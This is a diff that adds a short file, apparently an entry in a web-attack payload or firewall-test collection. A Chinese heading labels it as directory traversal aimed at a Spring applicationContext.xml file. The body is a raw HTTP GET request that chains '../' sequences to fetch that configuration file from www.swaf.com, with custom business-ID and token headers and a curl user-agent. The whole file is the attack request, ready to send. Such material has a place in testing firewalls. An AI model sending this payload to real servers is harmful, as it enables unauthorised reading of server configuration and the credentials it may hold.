@@ -1,0 +1,9 @@
+# 目录遍历_com/config/applicationContext.xml
+# applicationContext.xml是Spring应用程序的上下文配置文件，用于定义Spring容器中bean的创建、初始化、装配和管理。在这个文件中，我们可以配置各种bean及其依赖关系，甚至可以定义切面、事务管理、数据源等。
+GET /../../../../../../../../../../../com/config/applicationContext.xml?acid=80050818&bid=hd_tag_m8mv24m6 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24m6
+RM-PRO-Token: 72a7874f93dba574438e4cfa8c6af94e
+RM-PRO-Time: 1742808392070
+User-Agent: curl/7.83.1
+
